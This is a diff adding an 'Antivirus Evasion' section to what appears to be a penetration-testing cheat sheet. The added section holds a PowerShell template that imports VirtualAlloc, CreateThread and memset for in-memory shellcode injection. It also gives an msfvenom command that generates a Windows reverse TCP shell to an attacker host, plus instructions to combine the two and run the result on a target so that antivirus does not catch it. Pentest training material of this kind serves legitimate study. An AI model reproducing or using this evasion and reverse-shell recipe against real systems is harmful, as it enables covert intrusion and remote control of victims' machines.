@@ -159,6 +159,7 @@ Thank you for reading.
 	- [Social Engineering Tools](#social-engineering-tools)
 		- [Microsoft Office Word Phishing Macro](#microsoft-office-word-phishing-macro)
 		- [Microsoft Windows Library Files](#microsoft-windows-library-files)
+	- [Antivirus Evasion](#antivirus-evasion)
 	- [CVE](#cve)
 		- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
 		- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
@@ -7595,6 +7596,37 @@ Put the `shortcut file (*.lnk)` into the `webdav` folder.
 ```shell
 swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
 ```
+
+### Antivirus Evasion
+
+#### Evading AV with Thread Injection on Windows (memory injection)
+
+A basic templated script that performs in-memory injection is shown in the listing below.
+
+```cmd
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+<place shellcode here>
+```
+
+To generate the shellcode use the following command:
+
+```shell
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh-reflection
+```
+Concat the basic template with the generated reverse shell script by msfvenom into a ps1 file and run it on the machine you want to attack.
+
+> Note: The format `psh-reflection` (Powershell reflection) is used. Powershell reflection script begins by allocating unmanaged memory, then decodes the base64-encoded shellcode and transfers it into that memory. Afterwards, it builds a dynamic assembly that includes a method designed to run the injected payload.
+
+> Note: The generated payload is intended for x86 systems, so we need to start a x86 shell on windows (`Windows PowerShell (x86)`) 
 
 ### CVE
 
